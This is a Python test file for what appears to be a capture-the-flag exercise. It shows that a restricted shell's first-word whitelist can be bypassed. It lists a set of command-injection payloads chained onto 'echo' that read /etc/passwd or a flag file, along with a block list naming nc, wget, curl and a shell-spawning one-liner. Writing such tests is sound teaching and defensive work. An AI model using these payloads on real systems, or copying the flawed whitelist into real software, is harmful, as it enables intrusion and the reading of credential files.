#!/usr/bin/env python3
"""Stage 2 tests: Command injection vulnerability in restricted shell."""

import sys
import io

# Force UTF-8 output on Windows
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# --- Extracted logic from restricted_shell.py (lines 20, 48-58) ---

ALLOWED_COMMANDS = ['ls', 'pwd', 'whoami', 'id', 'help', 'date', 'echo', 'clear', 'exit']

def get_base_command(cmd_input):
    """Extract the base command (first word) from input"""
    return cmd_input.strip().split()[0] if cmd_input.strip() else ""

def is_command_allowed(cmd_input):
    """Check if the command is in our whitelist (first word only)."""
    base_cmd = get_base_command(cmd_input)
    return base_cmd.lower() in ALLOWED_COMMANDS

# --- Helpers ---

def assert_eq(actual, expected):
    assert actual == expected, f"Expected {expected!r}, got {actual!r}"

def assert_true(val, msg=""):
    assert val, msg

def assert_false(val, msg=""):
    assert not val, msg

# --- Test harness ---

passed = 0
failed = 0

def test(name, fn):
    global passed, failed
    try:
        fn()
        passed += 1
        print(f"  \u2713 {name}")
    except AssertionError as e:
        failed += 1
        print(f"  \u2717 {name}")
        print(f"    {e}")
    except Exception as e:
        failed += 1
        print(f"  \u2717 {name}")
        print(f"    {e}")

# ========== get_base_command ==========
print("\nget_base_command")

test("simple command: 'ls' -> 'ls'",
     lambda: assert_eq(get_base_command('ls'), 'ls'))

test("with args: 'echo hello' -> 'echo'",
     lambda: assert_eq(get_base_command('echo hello'), 'echo'))

test("leading whitespace: '  ls -la' -> 'ls'",
     lambda: assert_eq(get_base_command('  ls -la'), 'ls'))

test("empty string -> ''",
     lambda: assert_eq(get_base_command(''), ''))

test("whitespace only -> ''",
     lambda: assert_eq(get_base_command('   '), ''))

test("with pipe: 'echo test | cat /etc/passwd' -> 'echo'",
     lambda: assert_eq(get_base_command('echo test | cat /etc/passwd'), 'echo'))

test("with semicolon: 'echo test; cat /etc/passwd' -> 'echo'",
     lambda: assert_eq(get_base_command('echo test; cat /etc/passwd'), 'echo'))

# ========== Whitelist enforcement (allowed) ==========
print("\nwhitelist enforcement (allowed)")

for cmd in ALLOWED_COMMANDS:
    test(f"'{cmd}' is allowed",
         lambda c=cmd: assert_true(is_command_allowed(c), f"Expected {c} to be allowed"))

test("case insensitive: 'LS' -> allowed",
     lambda: assert_true(is_command_allowed('LS'), "Expected 'LS' to be allowed"))

test("case insensitive: 'Echo' -> allowed",
     lambda: assert_true(is_command_allowed('Echo'), "Expected 'Echo' to be allowed"))

# ========== Whitelist enforcement (blocked) ==========
print("\nwhitelist enforcement (blocked)")

blocked_commands = [
    'cat /etc/passwd',
    'sudo ls',
    "python3 -c \"import os; os.system('sh')\"",
    'bash', 'sh', 'nc', 'wget', 'curl', 'rm',
]

for cmd in blocked_commands:
    test(f"'{cmd}' is blocked",
         lambda c=cmd: assert_false(is_command_allowed(c), f"Expected '{c}' to be blocked"))

test("empty input is blocked",
     lambda: assert_false(is_command_allowed(''), "Expected empty input to be blocked"))

# ========== Injection vectors (all bypass whitelist) ==========
print("\ninjection vectors (bypass whitelist)")

injection_vectors = [
    ('pipe', 'echo test | cat /home/ctf_user/flag2.txt'),
    ('semicolon', 'echo test; cat /etc/passwd'),
    ('AND', 'echo test && cat /etc/passwd'),
    ('OR', 'echo test || cat /etc/passwd'),
    ('background', 'echo test & cat /etc/passwd'),
    ('backtick substitution', 'echo `cat /etc/passwd`'),
    ('dollar substitution', 'echo $(cat /etc/passwd)'),
    ('output redirect', 'echo test > /tmp/pwned'),
    ('input redirect', 'echo test < /etc/passwd'),
    ('newline', 'echo test\ncat /etc/passwd'),
]

for name, payload in injection_vectors:
    test(f"{name}: '{payload[:50]}' passes whitelist",
         lambda p=payload: assert_true(is_command_allowed(p), "Expected injection to pass whitelist"))

# ========== Stage 2 exploit verification ==========
print("\nstage 2 exploit verification")

test("intended payload passes whitelist",
     lambda: assert_true(is_command_allowed('echo test | cat /home/ctf_user/flag2.txt')))

test("base command of payload is 'echo'",
     lambda: assert_eq(get_base_command('echo test | cat /home/ctf_user/flag2.txt'), 'echo'))

test("'echo' is in ALLOWED_COMMANDS",
     lambda: assert_true('echo' in ALLOWED_COMMANDS))

test("direct 'cat /home/ctf_user/flag2.txt' is blocked",
     lambda: assert_false(is_command_allowed('cat /home/ctf_user/flag2.txt')))

# ========== Summary ==========
print(f"\n{passed} passed, {failed} failed\n")
sys.exit(1 if failed > 0 else 0)
